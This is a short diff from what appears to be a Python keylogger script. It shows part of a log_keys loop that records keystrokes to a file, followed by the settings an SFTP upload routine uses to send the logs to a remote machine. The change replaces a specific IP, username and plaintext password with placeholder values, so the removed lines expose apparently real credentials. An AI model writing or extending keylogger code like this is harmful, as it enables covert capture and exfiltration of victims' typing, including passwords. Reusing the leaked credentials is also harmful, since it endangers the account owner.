@@ -100,10 +100,10 @@ def log_keys():
                     file.write(chr(key) if 32 <= key <= 126 else f'[{key}]')
         time.sleep(0.1)
 
-REMOTE_HOST = "182.133.112.20"  # Change to your remote machine's IP
-REMOTE_USER = "shome"
-REMOTE_PASSWORD = "Shome2314@#"
-REMOTE_PATH = "/home/jagob/logs/"  # Target folder
+REMOTE_HOST = "100.100.100.200"  # Change to your remote machine's IP
+REMOTE_USER = "abc"
+REMOTE_PASSWORD = ""
+REMOTE_PATH = "/home/abc/logs/"  # Target folder
 
 def upload_log_sftp(log_filename):
     try:
